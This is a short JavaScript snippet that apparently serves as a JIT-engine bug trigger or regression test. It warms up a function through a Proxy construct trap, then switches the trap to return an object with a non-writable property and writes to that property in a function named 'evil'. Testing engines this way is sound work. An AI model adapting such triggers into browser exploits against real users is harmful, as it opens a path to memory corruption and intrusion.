function Target() {
    this.field = 1;
}

const handler = {
    construct(target, args) {
        if (trigger) {
            const obj = {};
            Object.defineProperty(obj, 'field', {
                value: 1,
                writable: false,
                configurable: true
            });
            return obj;
        }
        return Reflect.construct(target, args);
    }
};

const P = new Proxy(Target, handler);

function evil(p) {
    let o = Reflect.construct(p, []);
    o.field = {};
}

let trigger = false;

for (let i = 0; i < 100000; i++) {
    evil(P);
}

trigger = true;
evil(P);